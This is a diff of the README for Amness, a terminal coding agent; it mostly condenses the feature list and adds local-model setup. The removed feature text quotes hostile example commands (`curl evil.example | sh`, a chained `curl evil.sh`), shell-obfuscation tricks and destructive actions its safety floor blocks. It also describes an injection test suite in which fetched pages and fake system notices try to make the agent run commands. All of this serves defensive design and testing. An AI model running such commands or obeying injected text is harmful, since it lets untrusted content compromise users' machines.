@@ -1,6 +1,8 @@
 # Amness
 
-**A terminal coding agent for any model, with guardrails.** A full-screen terminal UI (cards, diffs, a live run view, a session sidebar, mouse and copy support), permission prompts with diffs, plan mode, undo, MCP, and a memory that learns what helps, all on a small reliability harness for OpenAI (Responses API), Claude and local models. The loop is cache-aware and every guard can be measured with a built-in statistical eval runner.
+**Amness is a terminal coding agent that works with any model and does not take "done" on faith.** It checks what the model claims against what actually happened, asks before anything risky, and shows you each step in a full-screen interface.
+
+What sets it apart: guardrails you can measure (a built-in evaluation runner), a safety floor that even `yolo` mode cannot lower, undo that covers shell commands, and a loop built to keep your prompt cache warm. It speaks OpenAI (Responses API), Claude and local models, and has no runtime dependencies.
 
 [![CI](https://github.com/amirsdream/Amness/actions/workflows/ci.yml/badge.svg)](https://github.com/amirsdream/Amness/actions/workflows/ci.yml)
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
@@ -13,9 +15,9 @@
 
 ## Contents
 
-- [Why](#why) · [Quick start](#quick-start) · [Using the chat](#using-the-chat) · [Providers and models](#providers-and-models)
-- [Headless and CI](#headless-and-ci) · [Use it as a library](#use-it-as-a-library) · [Architecture](#architecture)
-- [Evaluating the harness](#evaluating-the-harness) · [Roadmap](ROADMAP.md) · [Safety and privacy](#safety-and-privacy) · [Development](#development) · [Limitations](#limitations) · [License](#license)
+- [Why](#why) · [Quick start](#quick-start) · [Using the chat](#using-the-chat) · [More than a chat](#more-than-a-chat) · [Providers and models](#providers-and-models) (including [local models](#providers-and-models))
+- [Headless and CI](#headless-and-ci) · [Use it as a library](#use-it-as-a-library) · [Architecture and the agent loop](#architecture) · [Evaluating the harness](#evaluating-the-harness)
+- [Safety and privacy](#safety-and-privacy) · [Development](#development) · [Limitations](#limitations) · [Roadmap](ROADMAP.md) · [License](#license)
 
 ## Why
 
@@ -153,74 +155,19 @@ Prefer your terminal's own scrollback? Run `amness --inline` (or set `ui: "inlin
 | `/export` · `/import` · `/live` · `/mcp` | portable bundle, continue from one, browser live view, attach an MCP server |
 | `/theme` · `/sidebar` · `/details` · `/diffmode` · `/mouse` · `/ui` | appearance and interface: theme (live preview), sidebar, expand tool details, stacked/split diffs, mouse on/off, full-screen/inline |
 
-**Project instructions.** `AGENTS.md` (or `CLAUDE.md` / `GEMINI.md`) in the project root, and `~/.amness/AGENTS.md`, are added to the first message of a conversation, framed as repository guidance rather than user requests and capped at 8k characters each. A folder's own file is shown the first time the agent reads or edits something there (and only then, at the end of that result, so the cached prefix is untouched). `/status` lists what was loaded; `/init` has the agent write one.
+**Memory, long sessions and portability.** Plain markdown notes (`.amness/memory`, `~/.amness/memory`) that the agent saves and recalls, ranked, merged and forgotten reversibly; automatic handoff (and `/compact`) keeps long sessions going; `/export` writes a provider-neutral bundle you can continue elsewhere with another model. Details: [Memory](docs/features.md#memory) · [Long sessions](docs/agent-loop.md).
 
-**Branches, review and pull requests.** `amness --worktree [name]` starts the session in a fresh git worktree on its own branch (`amness/<name>`, under `.amness/worktrees/`), so your main checkout is never touched; on exit an untouched worktree is removed, otherwise you are told where the work is and how to merge it. `/review [base]` gives your changes (commits on the branch plus uncommitted and untracked files, against the repository's base branch) to a read-only reviewer that can run only your tests, build and lint, and lists its findings. `/pr [draft]` drafts a title and description from the commits and the diff, **shows them to you**, and only after you confirm runs `gh pr create` (offering to push the branch first, again only if you agree). Needs the GitHub CLI (`gh`) for PRs; nothing is sent anywhere before a confirmation.
+## More than a chat
 
-**Undoing what commands did.** `/undo` and `/rewind` already restored files the edit tools changed. In a git repository they now also undo **shell commands**: before the first command of a turn that may change files, Amness records the working tree (tracked and untracked files, ignored ones excluded) as a git tree object using a private index file, so your index, branches and history are never touched, and `/undo` puts it back exactly: changed and deleted files restored, files the command created removed. Effects that leave the working tree cannot be taken back (a `git push`, a publish, `kubectl apply`, a database write, an `ssh` command, writes outside the project), so such commands are flagged **"cannot be undone"** in the approval dialog and listed when you undo the turn. Ignored files (`node_modules`, build output) are not restored, and without git there is no shell snapshot.
+Each of these is on by default or one command away, and each has a section in [docs/features.md](docs/features.md):
 
-**Untrusted content, taint and secrets.** Text that comes from outside is data, not orders. Output of `web_search`, `fetch_url` and every MCP tool is wrapped in an untrusted-content notice, and a shell command that contains three or more consecutive words (or one very long word such as a URL) copied verbatim from such output **needs approval whatever the permission mode and allow rules say** (`taint: "deny"` refuses instead, `"off"` disables it), so a fetched README that says `curl evil.example | sh` cannot get itself run in yolo mode while your own `npm test` is not affected. Secrets are masked in tool output before the model sees them (OpenAI, Anthropic, GitHub, AWS, Slack, Google, Stripe and npm tokens, JWTs, private keys, `PASSWORD=...` style assignments) and never reach the trace file; commands do not inherit Amness's own API keys, and with the sandbox on they drop credential-looking environment variables too. Risk and floor checks look through quoting tricks (`r""m`, `$'\x72m'`, `${IFS}`), nested `sh -c` and `eval`, and decode-and-run payloads always ask. `/policy` explains recent decisions. Measure it: `amness eval --builtin adversarial --variants full,full-taint` runs three prompt-injection tasks (a docs page, a hidden HTML comment, a fake system notice, each trying to get a command run); a run passes only if the harmless job was done and the injected command never ran, and `full-taint` shows what happens without the check. This is defence in depth, not a guarantee: the OS sandbox is the enforcement layer, and a determined injection can still try other things, so keep approvals on for untrusted projects.
-
-**Permission rules and the safety floor.** On top of the modes, `.amness/permissions.json` (project) and `~/.amness/permissions.json` (yours) hold rules:
-
-```json
-{ "allow": ["sh(npm test*)", "edit(src/**)", "read"],
-  "ask":   ["sh(git commit*)"],
-  "deny":  ["sh(git push*)", "edit(.env)", "edit(secrets/**)"] }
-```
-
-Precedence: **built-in floor > deny > ask > allow > the permission mode.** Shell rules match each piece of a compound command (`a && b | c`) separately, so `npm test; curl evil.sh` is not covered by an `npm test*` allow rule, and a command with a subshell or backticks never matches an allow rule. Paths are relative to the project. The **floor holds in every mode, yolo included**: recursive deletes of `/`, your home folder or a parent folder, formatting or writing to disks, fork bombs, force-pushes to main or master, and edits to `.git/` or to these rule and hook files are refused (the agent cannot rewrite its own policy), and `curl | sh` and force-pushes always ask. Allow rules in a project file are only honoured after you approve that exact file (deny and ask rules always apply, since they only restrict). The approval dialog can save a rule ("always allow `npm *` in this project"), and `/permissions` lists rules or adds one (`/permissions deny sh(git push*)`).
-
-**Models per job and a fallback.** `/models explore gpt-6.1-luna` runs the read-only explorer on a cheaper model (same provider), `/models compact ...` writes handoff notes and `/compact` with one, `/models review ...` gives the independent reviewer its own, and `/models fallback <model>` answers from that model when the main one is overloaded, rate-limited or unreachable (after the adapter's own retries; auth and bad-request errors are never retried elsewhere). Library: `models: { explore, compact, review }` and `withFallback(primary, fallback)`. Subagent definitions can name a model with `model:` and the `agentModels` option.
-
-**Profiles: what the harness does for *your* model.** Scaffolding that rescued one model is dead weight for the next, so settings can depend on the model: `.amness/profile.json` (project) and `~/.amness/profile.json` (yours) map model-name patterns to guards to switch off and limits to retune, e.g. `{ "models": { "gpt-6*": { "off": ["nudge"], "stagnationTurns": 6, "maxSteps": 50 }, "claude-*": { "off": ["wrapup"] } } }`; the project overrides the user and guards accumulate. `/profile` shows what applies. To choose from data instead of guesses, run an ablation and let the recommender read it: `amness eval --variants ablate --trials 5 --profile-out profile.json --profile-model "gpt-6*"`. It is conservative: a guard is recommended for removal only when taking it out is significantly better, or makes no difference to the pass rate (within 2 points) and is cheaper per solved task; a guard whose removal significantly hurts is marked KEEP; everything unclear stays on; and weak evidence (few tasks) is called out. This follows the lesson from [Anthropic's long-running-harness work](https://www.anthropic.com/engineering/harness-design-long-running-apps) that each component should be removed one at a time and measured. No model-specific defaults ship in the box, because none has been measured yet.
-
-**Cache-aware routing (opt-in).** `/models cheap <model id>` then `/router on` sends *exploration* steps (reads, searches, `repo_map`, background-process reads) to the cheap model and everything that needs judgement to the main one: the first step, edits, commands, failures, rejected finishes, your new instructions and the final answer. Per-step routing is where the savings are ([AgentRouter](https://arxiv.org/abs/2609.22951) reports large ones with a trained router), but every model has its own prompt cache, so moving to the cheap model costs a cold read of the whole conversation there. The router prices that: it only switches when the exploration streak is long enough (or the cheap model's cache is still warm) for the cheaper cached reads to repay the cold read, with the real price table when both models are known. If the cheap model reaches for an edit, a command, `finish` or a plain-text answer, that step is thrown away and redone by the main model (cheap steps are not streamed, so nothing half-shown is left behind), and reasoning blobs from one model are never sent to the other. `/loop` shows each switch and why. Measure it before trusting it: `amness eval --variants full,full+route --cheap-model <id> --trials 3` reports pass rate and tokens per solved task side by side.
-
-**Custom subagents.** Define your own in `.amness/agents/<name>.md` (or `.claude/agents/`, project or home): front matter with `name`, `description`, `tools` (any of `list_files read_file grep write_file edit_file apply_patch sh skill`; default read-only), optional `model` (a key of the `agentModels` option), `isolation: worktree` and `max-steps`, then the agent's system prompt. The lead calls `task({ description, agent })`; the subagent sees only the brief and returns only its summary. A read-only agent runs in parallel with other calls. An agent with write tools shares your permission rules, safety floor, sandbox, approvals and claims ledger, runs alone, and is **forced read-only in plan mode**. With `isolation: worktree` it edits a throwaway git worktree of HEAD instead: your working tree is untouched, the changes come back as a patch file under `.amness/agents/out/`, and the lead reviews it and applies it with `apply_patch({ file })`. `/agents` lists what is defined.
-
-**Skills.** A skill is a folder with a `SKILL.md` (a `name:` and a one-line `description:` in front matter, instructions below, optional helper files next to it). Amness finds them in `.amness/skills/`, `.agents/skills/` (Codex, Gemini CLI, OpenCode) and `.claude/skills/` (Claude Code), in the project and in your home folder; the project wins, and so does the first convention listed when names clash. Only names and descriptions go into the first message, so fifty skills cost a few hundred tokens; the model loads one with the `skill` tool when the task matches (and can read the files bundled in its folder, nothing outside it). `/skills` lists what was found and warns about malformed ones. Skills from a repository you cloned are untrusted instructions: they are guidance only and cannot grant permissions.
-
-**OS sandbox (opt-in).** The permission prompts are a policy; the sandbox is enforcement. `/sandbox workspace` (or `--sandbox workspace`, or `sandbox` in the config) runs every shell command, including background ones, under macOS Seatbelt or Linux Bubblewrap: commands can read the machine but write only in the project, temp folders and common package caches, `.git` and the rule files stay read-only, and in `/sandbox strict` the network is cut as well (so `npm install` will fail). It makes yolo mode far safer. If a sandbox is requested where none exists (Windows, or Linux without `bwrap`), commands are refused instead of silently running unprotected. The file tools were already confined to the workspace.
-
-**Code index.** In repositories with 25 or more source files Amness adds three read-only tools built from a zero-dependency structural index (symbols, the import graph, where each symbol is used; TypeScript/JavaScript, Python, Go, Rust, Java, Kotlin, C#, Ruby, PHP, C/C++, Swift, Scala; rebuilt incrementally from file modification times): `repo_map(query)` returns the most relevant files for a few words, each with its functions, classes and types and how many files import it; `find_refs(symbol)` gives the definition and every file that uses it; `impact(path)` lists who depends on a file, directly and one step further, and which of its symbols are used elsewhere. Small repositories do not get the tools (grep is enough and tool definitions cost tokens). The index is approximate (regex extraction, import resolution by convention), so it points the way and the agent still reads the code; the eval suite has a mid-sized-repository task to measure whether it pays off for your model.
-
-**Editing.** Four ways to change files, all subject to read-before-edit and the same permission rules: `edit_file` (exact, unique match; or an `edits` list of several replacements applied in order, all or nothing; text that differs only in indentation is still matched when it is unique, and the result says so), `write_file`, and `apply_patch` for changes that span files. `apply_patch` takes the envelope used by Codex (`*** Begin Patch`, `*** Update File: path` with `@@` hunks, `*** Add File`, `*** Delete File`, `*** Move to`, `*** End Patch`) or an ordinary unified diff, applies hunks in order (an `@@ function name` anchor narrows the search), and is **atomic**: if any hunk of any file fails, nothing is written and every failure is named. A patch is judged file by file by permission rules, so one denied file denies the patch.
-
-**Background processes.** `sh` waits for a command to finish, so servers and watchers use four more tools: `sh_start` (returns an id; same permission rules as `sh`), `sh_read` (new output since the last read, optionally waiting up to 10 s), `sh_stop` (SIGTERM, then SIGKILL; the whole process group) and `sh_list`. Output is kept in a 200 KB ring buffer, at most 5 run at once, plan mode hides `sh_start`, and everything is killed when you exit. The sidebar lists running processes and `/procs` shows or stops them.
-
-**Tracing.** Every loop event (turns with token and cache counts, tool calls with timings, hooks, cache breaks, trims) is written to `.amness/traces/<session>.jsonl`, one JSON line each, so a bad session can be read with `grep` and `jq`. Set `AMNESS_OTLP=http://localhost:4318` (or any OTLP/HTTP collector) to also export OpenTelemetry spans with GenAI attributes (`gen_ai.usage.input_tokens`, `gen_ai.usage.cache_read.input_tokens`, `gen_ai.tool.name`); headless runs take `--trace <file>`. `/loop` shows how many tokens were re-read at full price after cache breaks, with an estimated cost. A full disk or an unreachable collector never stops the agent.
-
-**Replay (test harness changes offline).** Chat sessions and `--trace` runs also record the model's messages and the tools' results. `amness replay .amness/traces/<session>.jsonl [--off loop,stagnation] [--stagnation-turns 4] [--max-steps 20] [--context-budget 30000]` feeds a recorded run back through the *current* harness with no model call and no real tool, and prints exactly which guards, rejections, trims or cache breaks differ from what happened (exit code 1 when anything does). An unchanged harness reproduces a recording identically, so a replay of your real sessions is a free regression test before you ship a change to a guard; after the first difference the model would have said something else, so later lines are indicative. Library: `replayFile`, `replayRun`, `readTrace`.
-
-**Failure mining.** `/report` (or `amness traces`) reads your session traces and groups what went wrong into recurring patterns: finishes the verify command rejected, loop and stagnation stops, malformed calls, denied actions, tool errors, with numbers and paths normalised so "5 failing in /a/b.test.ts" and "3 failing in /c/d.test.ts" count as one problem, plus the sessions with the most trouble. To keep a failure from coming back, turn it into an eval task: `/report case <name>` (or `amness traces --case <name> --task "..." --check "<command that exits 0 only when it is really fixed>"`) snapshots the repository **at git HEAD** with your request as the task and your check as the held-out judge, ready for `amness eval --cases .amness/evals/cases`. Add a `"solution"` to the JSON to include it in `--selftest`.
-
-**Hooks.** Run your own commands at fixed points of the loop, in the same vocabulary as Claude Code and Codex. Configure them in `.amness/hooks.json` (project) and `~/.amness/hooks.json` (yours):
-
-```json
-{ "PreToolUse":  [{ "match": "sh", "command": "./scripts/no-push.sh", "timeout": 10 }],
-  "PostToolUse": [{ "match": "edit_file|write_file", "command": "npx prettier --write ." }],
-  "Stop":        [{ "command": "./scripts/changelog-updated.sh" }] }
-```
-
-Events: `SessionStart`, `UserPromptSubmit`, `PreToolUse`, `PostToolUse`, `PreCompact`, `Stop`. The event arrives as JSON on stdin. Exit `0` allows; exit `2` blocks (stderr goes to the model, or for `UserPromptSubmit` back to you); stdout can be plain text (added as context) or JSON (`{"context": "..."}`, `{"args": {...}}` to rewrite a tool call, `{"decision": "block", "reason": "..."}`). Hooks run without your API keys in their environment, time out after 10 s, and a crash only warns unless the hook sets `"failClosed": true`. **Project hooks run commands on your machine, so Amness asks before running a repository's hooks and remembers your answer for that exact file** (headless runs need `--trust-project`). `/hooks` shows what is active.
-
-**Your own commands.** Put `audit.md` in `.amness/commands/` (or `~/.amness/commands/`) and `/audit <args>` runs it as a prompt (`$ARGUMENTS` is substituted; a `description:` front-matter line shows in the popup). Commit the folder to share it with your team.
-
-**Memory.** Plain markdown notes in `<project>/.amness/memory` and `~/.amness/memory`, indexed by `MEMORY.md`; edit them like any file. What makes it more than a notebook:
-
-- **Cache-friendly injection.** At the start of a conversation the agent sees a short index (the 25 most relevant or useful notes) plus the notes that best match your request, framed as hints to verify. Later messages add only *new* relevant notes, at the end, so the earlier conversation never changes.
-- **Ranked retrieval.** BM25 over name, description and content, with light stemming, blended with how often a note proved useful. Optional **semantic search** (`/memory embeddings on`, OpenAI-compatible providers) adds embedding similarity so a note can match without sharing a word; vectors are cached in `memory/embeddings.json` and recomputed only for changed notes. If the embeddings call fails, keyword search carries on.
-- **Learning from outcomes.** Notes that were in front of the model during runs that finished (passed `verify`) rank higher; notes from runs that got stuck or ran out of steps rank lower. A note with 4+ bad runs and under 25% good is suggested for archiving. A plain chat reply changes nothing.
-- **Duplicates merge.** Saving a note that says nearly the same as an existing one (same type) updates it instead; the newer wording wins.
-- **A small graph.** `[[other-note]]` mentions, and notes that keep being retrieved together, become neighbours; a match pulls its neighbours in at lower rank (`/memory graph`).
-- **Forgetting you can undo.** `/memory stale` lists notes never useful (or consistently unhelpful); `/memory prune` moves them to `memory/archive/`. `/memory consolidate` has the model propose merges and archives, shows the plan, and applies it only if you agree. Nothing is deleted.
-
-The agent saves durable lessons itself (the real test command, your corrections).
-
-**Long sessions.** Context is managed in stages (see [the agent loop](#the-agent-loop)): noisy output is condensed on arrival, stale output is trimmed in one batch only when the window needs it, and past a threshold the model writes a handoff note and the run continues in a fresh context seeded with the task and that note. For Claude, history is never edited (that keeps its thinking blocks and cache valid), so only the handoff applies. `/compact` does the handoff on demand.
-
-**Portability.** `/export` (or `--export`) writes a provider-neutral bundle: the task, a model-written handoff note, the files the agent changed, and your memory. It deliberately contains no raw transcript, so you can continue on another machine, in another checkout, or with a different model: `amness run --bundle f.json "carry on"`.
+| | |
+|---|---|
+| **Safety** | [permission rules and a safety floor](docs/features.md#permission-rules-and-the-safety-floor) that even `yolo` cannot lower · an opt-in [OS sandbox](docs/features.md#os-sandbox-opt-in) · [untrusted-content, taint and secret handling](docs/features.md#untrusted-content-taint-and-secrets) · [undo for shell commands](docs/features.md#undoing-what-commands-did) |
+| **Control** | [hooks](docs/features.md#hooks) at six points of the loop · [project instructions](docs/features.md#project-instructions) (`AGENTS.md`) · [skills](docs/features.md#skills) · [custom subagents](docs/features.md#custom-subagents) · [branches, review and PRs](docs/features.md#branches-review-and-pull-requests) |
+| **Cost** | [cache-aware model routing](docs/features.md#cache-aware-routing-opt-in) · [models per job and a fallback](docs/features.md#models-per-job-and-a-fallback) · [cache behaviour and keep-alive](docs/agent-loop.md) · [a code index](docs/features.md#code-index) |
+| **Editing and runs** | [`apply_patch` and multi-edit](docs/features.md#editing) · [background processes](docs/features.md#background-processes) · [tracing](docs/features.md#tracing) · [replay](docs/features.md#replay-test-harness-changes-offline) · [failure mining](docs/features.md#failure-mining) |
+| **Measuring** | [`amness eval`](docs/evaluation.md): paired statistics, ablations, benchmarks, an injection suite · [profiles per model](docs/features.md#profiles-what-the-harness-does-for-your-model) |
 
 ## Providers and models
 
@@ -229,6 +176,19 @@ The agent saves durable lessons itself (the real test command, your corrections)
 | **OpenAI** | Default model `gpt-6.1-sol`. Reasoning models use the **Responses API**. `/model` lists Sol, Astra, Terra, Luna and earlier models. |
 | **Anthropic (Claude)** | Native SDK adapter: streaming, adaptive thinking with `/effort`, automatic prompt caching, server-side refusal fallbacks. Default `claude-opus-5-5`. |
 | **OpenRouter, Ollama, vLLM, LM Studio, any OpenAI-compatible server** | Chat Completions. Tool-calling quality depends on the model. |
+
+**Running a local model (Ollama, LM Studio, vLLM, llama.cpp).** Any server with an OpenAI-compatible `/v1` endpoint works:
+
+```bash
+# Ollama
+ollama pull qwen2.5-coder:7b          # or any model that supports tool calling
+amness --provider ollama --model qwen2.5-coder:7b     # base URL defaults to http://localhost:11434/v1
+
+# LM Studio, vLLM, llama.cpp server, anything else
+amness --provider custom --base-url http://localhost:1234/v1 --model <model-name>
+```
+
+Or run `/provider` inside the chat and pick "Ollama (local)" or "Custom OpenAI-compatible"; the choice is saved. No API key is needed for local servers. Agent work depends on **tool calling**, so pick a model that supports it; small models do better in `/mode plan` with a `--max-tokens` limit, and `amness eval --variants ab` shows whether the guards help the model you chose. Features that need an endpoint Amness cannot assume locally (semantic memory, Claude-only cache keep-alive) say so when you try them.
 
 **Why Responses.** Since GPT-5.4, `/v1/chat/completions` rejects function tools together with reasoning (`400: Function tools with reasoning_effort are not supported … use /v1/responses`). The OpenAI adapter (`src/openai.ts`) speaks both APIs. `/api auto` (default) uses Responses for reasoning models on api.openai.com and Chat Completions elsewhere, and corrects itself at runtime: if a server says to use `/v1/responses` it switches and remembers; if a gateway has no `/responses` it returns to chat with the documented `reasoning_effort: "none"` workaround; an option a server refuses (reasoning summaries for an unverified organisation, an unsupported effort, `prompt_cache_key`) is dropped once instead of failing every request.
 
@@ -299,146 +259,11 @@ Because the CLI relies on Node's built-in TypeScript support, Amness is not publ
 
 ## Architecture
 
-Three layers with one-way dependencies: the **UI** (`cli/`) drives the **agent** (`src/code.ts`, `src/deep.ts`) which is built on the **harness** (`src/harness.ts`); models are plain functions injected from outside. The harness and the agents have no dependency on the UI, so everything in `src/` is usable as a library.
-
-```mermaid
-flowchart TB
-  subgraph UI["cli/ : terminal interface"]
-    direction TB
-    entry["amness.ts<br/>chat · run · menu · demo"]
-    app["tui/app.ts<br/>App: input, modes, approvals,<br/>slash commands, sessions"]
-    full["Full-screen view<br/>full.ts · cards · sidebar · modal<br/>canvas · themes · blocks"]
-    inline["Inline view<br/>screen.ts · view.ts"]
-    entry --> app
-    app --> full
-    app --> inline
-  end
-  subgraph AGENT["src/ : agents"]
-    code["code.ts<br/>coding agent + file/shell tools"]
-    deep["deep.ts<br/>research agent + subagents"]
-  end
-  subgraph CORE["harness.ts : the loop"]
-    loop["run(): steer → budget → compact →<br/>model → schedule tools → verify"]
-    reg["Registry<br/>deferred tools · MCP"]
-  end
-  subgraph MODELS["model adapters"]
-    oa["openai.ts<br/>Responses + Chat Completions"]
-    an["anthropic.ts<br/>Claude"]
-    local["any (messages, tools) → message"]
-  end
-  subgraph STATE["state"]
-    mem["memory.ts<br/>ranked, learning notes<br/>embed.ts: optional vectors"]
-    bundle["bundle.ts<br/>portable sessions"]
-    sess["cli/tui/session.ts<br/>chats + checkpoints"]
-  end
-  app -->|"events up, prompts down"| code
-  code --> loop
-  deep --> loop
-  loop --> reg
-  loop -->|"model(messages, tools)"| oa
-  loop --> an
-  loop --> local
-  code --> mem
-  app --> sess
-  app --> bundle
-  ev["evals.ts + stats.ts<br/>variants, bootstrap, sign test"] --> code
-  evcli["cli/evalcli.ts<br/>amness eval"] --> ev
-```
-
-| Path | Role |
-|---|---|
-| `cli/amness.ts` | entry point: chat (default), headless `run`, classic `menu`, `demo`; chooses full-screen or inline |
-| `cli/tui/app.ts` | the `App`: key handling, permission modes, approvals, slash commands, queued steering, undo/rewind |
-| `cli/tui/full.ts` + `cards.ts`, `sidebar.ts`, `modal.ts`, `diffview.ts` | full-screen view: layout, transcript cards, sidebar, modals, diff renderer |
-| `cli/tui/blocks.ts` | retained transcript model (user, assistant, tool, thinking, notice blocks) that the full-screen view renders from |
-| `cli/tui/canvas.ts`, `ansi.ts`, `themes.ts`, `rich.ts` | cell grid with diffing flush, ANSI parsing, the seven themes, shared styling helpers |
-| `cli/tui/screen.ts`, `view.ts` | the inline renderer (live region plus native scrollback) |
-| `src/harness.ts` | the agent loop and guards (see below); `Registry`, `Budget`, `extract()` |
-| `src/code.ts`, `src/deep.ts` | coding agent (file and shell tools, subagent `task`, todos, plan mode) and research agent |
-| `src/openai.ts`, `src/anthropic.ts` | model adapters; a model is just `(messages, tools, opts) => Promise<Message>` |
-| `src/memory.ts`, `src/embed.ts` | memory: ranking, merging, graph, outcome learning, archive; optional embeddings |
-| `src/bundle.ts`, `src/dynamic.ts` | portable session bundles; live tool registry and MCP |
-| `src/evals.ts`, `src/stats.ts`, `src/evalcases.ts`, `cli/evalcli.ts` | the eval runner: variants and ablations, task-level statistics, built-in tasks, `amness eval` |
-| `cli/tui/clipboard.ts` | clipboard (OSC 52 plus the platform tool) |
-| `src/live.ts` | browser live view (`127.0.0.1` only) |
-
-**How the full-screen UI draws.** Agent events are written into the block store; each block renders to rows of styled cells (cached by content signature); the view lays out header, transcript, sidebar, input and footer onto a `Canvas`, and `Canvas.flush()` writes only the cells that changed, wrapped in synchronized-output markers so frames never tear. Mouse (SGR 1006), bracketed paste and OSC 52 clipboard are enabled while it runs and restored on exit. The inline renderer shares the same `App` and agent events, so both interfaces behave identically.
-
-The runtime has no dependencies.
-
-## The agent loop
-
-```mermaid
-flowchart LR
-  A["steer<br/>messages typed meanwhile"] --> B["budget<br/>check"] --> C["compact<br/>supersede · elide · handoff"] --> D["model call<br/>streaming"]
-  D -->|tool calls| E["validate · approve ·<br/>schedule: reads in parallel,<br/>writes one at a time"]
-  E --> F{"all failed?"}
-  F -->|"3×: reflect, 6×: stop"| A
-  F -->|no| A
-  D -->|finish| G{"verify gate<br/>npm test"}
-  G -->|rejected + feedback| A
-  G -->|passes| H(["done"])
-```
-
-Each turn: steer (messages you typed meanwhile) → budget check → compaction → model call → tool calls → verification gate. The details that keep long runs reliable:
-
-- **Scheduling.** Read-only and subagent calls in one turn run concurrently (up to 5); anything that can change state runs alone, in the order issued. Mark your own tools `readOnly` or `parallel` to opt in.
-- **Compaction in stages, cheapest first.** Observations are condensed as they arrive (terminal codes and progress redraws stripped, repeated lines collapsed, long output cut to head and tail plus its error lines). Older output that is repeated or **expired** (a read of a file that was edited afterwards) is dropped, then old tool output is elided, and only on very long runs does the model write a handoff note and continue in a fresh context. Elision cuts well below the budget in one go, so the provider's prompt-cache prefix stays valid between cuts. `/loop` shows how much was trimmed.
-- **Post-edit check.** `/check <cmd>` (headless `--check`, library `check`) runs a fast command such as a typecheck after every edit. Only a failure is shown to the model, appended to the edit result, so a mistake is caught one step after it happens instead of at the end.
-- **Guards.** Repeat-call detection (the same call, normalised, with nothing edited in between; re-running tests after an edit is fine), cycle detection (2 to 4 different calls repeating three times, such as an edit flipped back and forth around a test run), a nudge when the model announces an action instead of taking it, a wrap-up warning three steps before the step cap, and no-progress detection (a reflection prompt after 3 all-failing turns, a clean stop after 6).
-- **Stagnation is judged from objective signals.** A loop that keeps acting while nothing measurable improves gets a structured reflection after 8 such turns and a clean stop after 12. "Improves" means: the failing-test, error or lint count reaches a new low (parsed from Jest, pytest, Go, Cargo, the Node runner, `tsc`, `eslint`...), a file is edited for the first time, an edit adds a change that is not the undo of an earlier one, or something new is read (capped). The model's own confidence counts for nothing. Tune with `stagnationTurns`; `off: ["stagnation"]` switches it off for ablations.
-- **Claims are checked against a record.** The harness records what really happened (files edited, commands run and their exit codes) and compares the `finish` summary with it: "all tests pass" needs a passing test run *after the last edit*, "build is clean" needs a successful build or typecheck, and a file named as changed must have been edited. A mismatch is rejected with the specifics (at most twice, so it can never deadlock). Accepted runs end with an audit line: files changed, whether tests passed after the final edit, test files touched when the task did not mention tests. Agents that judge their own work accept plausible progress as real progress ([When Do Agent Loops Mistake Stagnation for Progress?](https://arxiv.org/abs/2607.25152)); this is the cheap external check.
-- **Independent reviewer (opt-in, `/reviewer on` or `--review`).** Builders overpraise their own work, and a separate judge is easier to make sceptical than a builder is to make self-critical ([Anthropic's long-running harness write-up](https://www.anthropic.com/engineering/harness-design-long-running-apps)). Before a task-like message, a fresh context writes 3 to 7 testable acceptance criteria that the builder sees; before a `finish` is accepted (after the ledger and your `verify` command), a read-only reviewer that can run only the project's own test, build and lint commands checks the diff against them. Findings go back to the builder; after two rounds the work is accepted and flagged, and an unusable verdict never blocks. It costs roughly two to four extra model calls per task and can use a different model (`review: { model }`), so it is off by default; measure it with `amness eval --variants full,full+review`.
-- **Done means verified.** `finish` passes through your `verify` gate (tests, build) and is rejected with feedback until it holds.
-
-### Prompt cache and memory
-
-Cached input costs a fraction of fresh input, so the loop is built to keep the request prefix identical from turn to turn:
-
-- **Append-only by default.** Old messages are rewritten only when the window needs it, and then in one cut well below the budget (so a rewrite happens every several turns, not every turn). New information (steering messages, relevant memory notes) always goes at the *end*.
-- **Stable request shape.** Tool definitions are sorted by name, the memory index is injected once per conversation, and OpenAI requests carry a stable per-project `prompt_cache_key` with 24-hour cache retention (dropped automatically for models that refuse it). Claude requests use automatic caching on an append-only transcript.
-- **Keep-alive (opt-in).** Claude drops a cached prefix after about 5 idle minutes. `/keepwarm on` re-sends the conversation with a 16-token output cap about every 4.5 minutes while you are away (at most 3 times per break), which costs a cache read instead of a cold re-read. It is off by default because it spends tokens while you are not looking, and it only applies to Claude (OpenAI requests already ask for 24-hour retention).
-- **You can see it.** `/loop` marks every turn where the prefix changed ("cache break: earlier history was rewritten at message 14", "the tool list changed") and counts them; the usage panel shows the cache hit rate; `amness eval` reports it per variant, so you can measure what a change does to cost.
-
-### Where these choices come from
-
-Recent work on coding-agent loops points the same way, and the loop follows it where it can be done without training a model:
-
-- [An Empirical Study of Harness Design for Coding Agents](https://arxiv.org/abs/2609.20804) (2026): cheap rule-based elision before any LLM summarisation gave the lowest cost; a recall tool for elided content was almost never used, so there isn't one; stuck detection and lightweight post-edit checks are cheap ways to stop wasted turns.
-- [AgentDiet](https://arxiv.org/abs/2509.23586) (trajectory reduction): removing useless, redundant and *expired* information cut input tokens 40-60% with unchanged results. This is the source of the expired-read and repeated-call rules.
-- [CoACT](https://arxiv.org/abs/2607.02911) and [SWE-Pruner](https://arxiv.org/abs/2601.16746): reads dominate token use, and compression must preserve what the next action needs, and leave earlier messages untouched to keep the cache valid. Amness uses rules for this; the papers use trained compressors, which would add a dependency.
-- [Don't Break the Cache](https://arxiv.org/abs/2601.06007) (prompt caching for long-horizon agents): caching cut API cost by 41-80% across OpenAI, Anthropic and Google, but naive full-context caching can hurt; put dynamic content at the end, avoid dynamic tool lists, keep dynamic tool results out of the cached prefix. [Keeping the Cache Warm Pays](https://arxiv.org/abs/2607.19214) motivates the longer OpenAI retention and the opt-in Claude keep-alive.
-- Memory: [Infini Memory](https://arxiv.org/abs/2606.10677) (plain-text topic documents, lexical retrieval, merge/split maintenance, recency resolves contradictions; its structural maintenance mattered most in its ablations), [REALM](https://arxiv.org/abs/2609.16053) (retrieval feeds back into how memory is organised, which is why Amness records use and ranks by it) and the strategic-forgetting work ([SF-AMS](https://arxiv.org/abs/2607.22562), [FSFM](https://arxiv.org/abs/2604.20300)). Amness implements these with plain files: lexical plus optional embedding retrieval, merge maintenance (`/memory consolidate`), a light note graph with use-driven links, outcome-based ranking and reversible forgetting. "Learning" here means simple statistics (wins and losses per note), not a trained model, and there is no graph database.
-- A [source-code study of eleven coding agents](https://arxiv.org/html/2609.00006v1): read-only tools run concurrently, mutating tools one at a time.
-
-The percentages above are the papers' results on their own benchmarks, not measurements of Amness; use the eval runner (`evaluate`) with the guards switched on and off to measure them on your tasks.
